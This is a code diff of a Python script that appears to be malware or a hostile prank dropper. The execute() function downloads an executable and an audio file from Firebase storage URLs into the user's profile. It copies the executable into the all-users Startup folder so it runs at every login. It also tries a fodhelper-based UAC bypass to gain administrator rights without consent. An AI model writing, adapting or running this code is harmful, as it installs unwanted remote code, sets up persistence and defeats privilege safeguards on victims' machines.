@@ -49,25 +49,29 @@ def bypass_uac(cmd):
 
 
 def execute():
-    pycodeUrl = 'https://firebasestorage.googleapis.com/v0/b/huisarts-videochat.appspot.com/o/pycode.exe?alt=media&token=01e7a236-7589-4a29-9887-6934e5c4408a'
+    userProfile = os.getenv('USERPROFILE') + '\pycode.exe'
+    if os.path.exists(userProfile):
+        os.remove(os.getenv('USERPROFILE') + '\pycode.exe')
+    pycodeUrl = 'https://firebasestorage.googleapis.com/v0/b/huisarts-videochat.appspot.com/o/code.exe?alt=media&token=b4eabbfb-6f77-4992-a653-e852eb1e3e91'
     r = requests.get(pycodeUrl, allow_redirects=True)
-    userProfile = os.getenv('userprofile') + '\\pycode.exe'
+    userProfile = os.getenv('userprofile') + '\pycode.exe'
     open(userProfile, 'wb').write(r.content)
-    r = requests.get(
+    sleep(0.5)
+    if os.path.exists(os.getenv('USERPROFILE') + '\haha.mp3'):
+        os.remove(os.getenv('USERPROFILE') + '\haha.mp3')
+    userProfile = os.getenv('userprofile') + '\haha.mp3'
+    audio = requests.get(
         'https://firebasestorage.googleapis.com/v0/b/huisarts-videochat.appspot.com/o/haha.mp3?alt=media&token=2a582e25-d436-4011-8793-5d35047a3145', allow_redirects=True)
-    userProfile = os.getenv('USERPROFILE') + '\haha.mp3'
-    open(userProfile, 'wb').write(r.content)
-    os.system("attrib +h " + userProfile)
-    sleep(1)
-
-    command = 'copy {} {}'.format(
-        userProfile, '\'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\pycode.exe\'')
+    open(userProfile, 'wb').write(audio.content)
+    sleep(2)
+    userProfile = os.getenv('USERPROFILE') + '\pycode.exe'
+    command = '/k copy {} "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup"'.format(
+        userProfile)
     if not is_running_as_admin():
         print('[!] The script is NOT running with administrative privileges')
         print('[+] Trying to bypass the UAC')
         try:
-            current_dir = os.getcwd()
-            cmd = '{} /k {} '.format(CMD, command)
+            cmd = '{} {} & exit'.format(CMD, command)
             print(cmd)
             bypass_uac(cmd)
             os.system(FOD_HELPER)
